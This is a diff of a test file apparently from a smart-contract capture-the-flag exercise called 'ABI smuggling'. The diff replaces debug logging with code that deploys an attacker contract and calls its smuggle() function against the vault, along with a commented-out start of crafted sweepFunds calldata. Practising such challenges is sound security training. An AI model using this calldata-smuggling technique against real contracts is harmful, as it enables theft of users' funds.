@@ -3,7 +3,7 @@ const { expect } = require('chai');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
-    let token, vault;
+    let token, vault, smuggler;
     
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
@@ -45,10 +45,8 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
-        const playerPermission = await vault.getActionId('0x85fb709d', player.address, vault.address);
-        console.log("deployerPermission: ", deployerPermission);
-        console.log("playerPermission: ", playerPermission);
+        smuggler = await (await ethers.getContractFactory('Smuggler', player)).deploy(token.address, recovery.address);
+        await smuggler.connect(player).smuggle(vault.address, "0xd9caed12");
         // let methodId = ethers.utils.id("sweepFunds(address,address)").slice(0, 10);
                 
         // let calldata = ethers.utils.hexConcat([
